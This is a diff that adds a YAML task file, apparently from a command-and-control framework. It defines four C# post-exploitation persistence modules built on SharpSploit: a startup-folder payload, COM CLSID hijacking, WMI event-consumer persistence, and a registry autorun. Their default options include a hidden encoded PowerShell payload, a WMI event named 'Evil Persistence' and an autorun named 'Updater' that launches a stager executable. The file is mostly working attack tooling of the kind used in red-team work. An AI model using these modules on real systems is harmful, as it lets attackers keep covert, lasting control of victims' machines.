@@ -1,0 +1,492 @@
+- Name: PersistStartup
+  Aliases: []
+  Description: >
+    Installs a payload into the current users startup folder.
+
+    	Payload: Payload to write to a file. E.g. "powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>".
+    	FileName: Name of the file to write. E.g. "startup.bat".
+  Author: 
+      Name: Daniel Duggan
+      Handle: _RastaMouse
+      Link: https://twitter.com/_RastaMouse
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+
+    using SharpSploit.Persistence;
+
+    public static class Task
+    {
+        public static string Execute(string Payload, string FileName = "")
+        {
+            try
+            {
+                if (Startup.InstallStartup(Payload, FileName))
+                {
+                    return "Startup Persistence suceeded for: " + FileName;
+                }
+                return "Startup Persistence failed for: " + FileName;
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Payload
+    Value: powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>
+    DefaultValue: ''
+    Description: Payload to write to a file.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: FileName
+    Value: startup.bat
+    DefaultValue: ''
+    Description: Name of the file to write.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: &o0
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: PersistCOMHijack
+  Aliases: []
+  Description: Hijacks a CLSID key to execute a payload for persistence.
+  Author: 
+      Name: Dennis Panagiotopoulos
+      Handle: den_n1s
+      Link: https://twitter.com/den_n1s
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    
+    using SharpSploit.Persistence;
+    
+    public static class Task
+    {
+        public static string Execute(string CLSID, string ExecutablePath)
+        {
+            if(COM.HijackCLSID(CLSID, ExecutablePath))
+            {
+                return "COM hijack succeeded for CLSID: " + CLSID + " with ExecutablePath: " + ExecutablePath;
+            }
+            return "COM hijack failed for CLSID: " + CLSID + " with ExecutablePath: " + ExecutablePath;
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: CLSID
+    Value: ''
+    DefaultValue: ''
+    Description: Missing CLSID to abuse.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: ExecutablePath
+    Value: ''
+    DefaultValue: ''
+    Description: Path to the executable path.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: *o0
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: PersistWMI
+  Aliases: []
+  Description: Creates a WMI Event, Consumer and Binding to execute a payload.
+  Author: 
+      Name: Daniel Duggan
+      Handle: _RastaMouse
+      Link: https://twitter.com/_RastaMouse
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+
+    using SharpSploit.Persistence;
+
+    public static class Task
+    {
+        public static string Execute(string EventName, string EventFilter, string EventConsumer, string Payload, string ProcessName = "", string ScriptingEngine = "")
+        {
+            try
+            {
+                WMI.EventFilter theEventFilter;
+                WMI.EventConsumer theEventConsumer;
+                WMI.ScriptingEngine theScriptingEngine;
+
+                if (EventFilter.ToLower() == "processstart") { theEventFilter = WMI.EventFilter.ProcessStart; }
+                else { return "WMI Persistence failed. Invalid Event Filter."; }
+
+                if (EventConsumer.ToLower() == "commandline") { theEventConsumer = WMI.EventConsumer.CommandLine; }
+                else if (EventConsumer.ToLower() == "activescript") { theEventConsumer = WMI.EventConsumer.ActiveScript; }
+                else { return "WMI Persistence failed. Invalid Event Consumer."; }
+
+                if (ScriptingEngine.ToLower() == "jscript") { theScriptingEngine = WMI.ScriptingEngine.JScript; }
+                else if (ScriptingEngine.ToLower() == "vbscript") { theScriptingEngine = WMI.ScriptingEngine.VBScript; }
+                else { return "WMI Persistence failed. Invalid Scripting Engine."; }
+
+                if (WMI.InstallWMIPersistence(EventName, theEventFilter, theEventConsumer, Payload, ProcessName, theScriptingEngine))
+                {
+                    return "WMI Persistence suceeded for: " + EventName;
+                }
+                return "WMI Persistence failed for: " + EventName;
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: EventName
+    Value: Evil Persistence
+    DefaultValue: ''
+    Description: >
+      Creates a WMI Event, Consumer and Binding to execute a payload.
+
+      	EventName: An arbitrary name to be assigned to the new WMI Event. E.g. "Evil Persistence".
+      	EventFilter: Specifies the event trigger to use. The options are "ProcessStart".
+      	EventConsumer: Specifies the action to carry out. The options are "CommandLine" (OS Command) and "ActiveScript" (JScript or VBScript).
+      	Payload: Specifies the CommandLine or ActiveScript payload to run. E.g. "powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>".
+      	ProcessName: Specifies the process name when the "ProcessStart" trigger is selected. E.g. "notepad.exe".
+      	ScriptingEngine: Specifies the scripting engine when the "ActiveScript" consumer is selected. The options are "JScript" and "VBScript".
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: EventFilter
+    Value: ProcessStart
+    DefaultValue: ''
+    Description: Specifies the event trigger to use.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: EventConsumer
+    Value: CommandLine
+    DefaultValue: ''
+    Description: Specifies the action to carry out.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Payload
+    Value: powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>
+    DefaultValue: ''
+    Description: Specifies the CommandLine or ActiveScript payload to run.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: ProcessName
+    Value: notepad.exe
+    DefaultValue: ''
+    Description: Specifies the process name when the ProcessStart trigger is selected.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: false
+  - Name: ScriptingEngine
+    Value: VBScript
+    DefaultValue: VBScript
+    Description: Specifies the scripting engine when the ActiveScript consumer is selected.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: *o0
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: PersistAutorun
+  Aliases: []
+  Description: >
+    Installs an autorun value in HKCU or HKLM to execute a payload.
+
+    	TargetHive: Target hive to install autorun. Specify "CurrentUser" for HKCU and "LocalMachine" for HKLM.
+    	Value: Value to set in the registry. E.g. "C:\Example\GruntStager.exe"
+    	Name: Name for the registy value.E.g. "Updater".
+  Author: 
+      Name: Daniel Duggan
+      Handle: _RastaMouse
+      Link: https://twitter.com/_RastaMouse
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+
+    using SharpSploit.Persistence;
+
+    public static class Task
+    {
+        public static string Execute(string TargetHive, string Name, string Value = "")
+        {
+            try
+            {
+                if (TargetHive.ToLower() != "hkey_current_user" && TargetHive.ToLower() != "hkcu" && TargetHive.ToLower() != "currentuser" &&
+                 TargetHive.ToLower() != "hkey_local_machine" && TargetHive.ToLower() != "hklm" && TargetHive.ToLower() != "localmachine")
+                {
+    				        return "Autorun Persistence failed. Invalid Target Hive specified.";
+                }
+
+                if (Autorun.InstallAutorun(TargetHive, Value, Name))
+                {
+                    return "Startup Persistence suceeded for: " + Name;
+                }
+                return "Startup Persistence failed for: " + Name;
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: TargetHive
+    Value: CurrentUser
+    DefaultValue: ''
+    Description: Target hive to install autorun.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Name
+    Value: Updater
+    DefaultValue: ''
+    Description: Name for the registy value.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Value
+    Value: C:\Example\GruntStager.exe
+    DefaultValue: ''
+    Description: Value to set in the registry.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: *o0
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
